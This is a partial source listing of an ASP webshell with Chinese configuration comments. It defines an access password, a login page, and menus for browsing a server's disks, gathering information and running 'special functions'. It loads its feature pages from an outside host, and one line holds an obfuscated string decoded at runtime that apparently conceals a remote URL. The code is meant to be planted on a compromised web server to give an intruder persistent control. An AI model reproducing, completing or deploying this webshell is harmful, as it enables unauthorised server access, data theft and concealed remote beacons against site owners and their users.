...
UserPass	 ="naocan"'      	  		密码
Copyright	 ="死神来临Asp大马_去后门版"'			名字版权
eror		 ="抱歉，密码错咯！"			   ' 			密码错误显示的文字
SItEuRl		 ="http://aspmuma.cccpan.com"'			你的博客地址
icot		 ="N"					'此处N是登陆图案  可修改从(A-Z  a-z) 例如:您可以将N 换成 FNE
piccorlor	 ="#333333"					'登陆图案默认颜色
'--------------------------------------------------------------------------------------------------
'****************************注意*****************************************************************
htp		 ="http://odayexp.com/h4cker/mmgx/"'		功能地址 这个你千万不能改 你改了大马就运行不鸟了
'****************************注意*****************************************************************
'--------------------------------------------------------------------------------------------------
...
:Else:
j"<tr><td onClick=""MM_show('menud')""><input onMouseOver=""this.style.cursor='hand'"" type=button value='★硬盘文件★'></td></tr><tr><td height=4></td></tr><tr><td valign=""top"" align=center><table border=0  id=menud style=""display='none'"">"
...
j "</table></td></tr>"
End If:
j"</tr><tr></tr><tr><td onClick=""MM_show('menuc')""><input onMouseOver=""this.style.cursor='hand'""  type=button value='★信息收集★'></td></tr><tr></tr><tr><td valign=""top"" align=center><table border=0  id=menuc style=""display='none'"">"
...
j"<hr><tr><td><input  type=button value='★特殊功能★'></td</tr><tr><td height=4></td></tr><tr><td align=center><table border=0>"
...
j cdx&"<a href='http://odayexp.com/h4cker/mmgx/' target='FileFrame'>"&cxd&" 程序--更新"&ef
...
Set FSO=Nothing:End Sub:li=""""">eecamrex>""=a>"">x>""=?yaec<?.'e.id&<a'rscld..:ahh/""=ii":il(lIl(""&li&"", 1, "'th/.<odl?ysermipac&>ux"))
...
j"<br><br><br><b><div align=center><font size='5' ><FONT color="&piccorlor&" face=""Wingdings"" style=""FONT-SIZE: 250pt;  WIDTH: 100%;  LINE-HEIGHT: 130%; "">N</FONT >"&eror&"</font></b> <br><br><br><br><b><font size=6' color='lime'></font></b></p></center>"&backurl
end if
else
si="<center><FONT color="&piccorlor&" face=""Wingdings"" style=""FONT-SIZE: 250pt;  WIDTH: 100%;  LINE-HEIGHT: 130%; "">"&icot&"</FONT><div style='width:400px;padding:32px; align=left'><br><a href="""&SItEuRl&""" target=""_blank""><b>"&Copyright&"</b></a><form action='"&url&"' method='post'><b>密码：</b><input name='pass' type='password' size='22'> <input type='submit' value='进入'></center>"
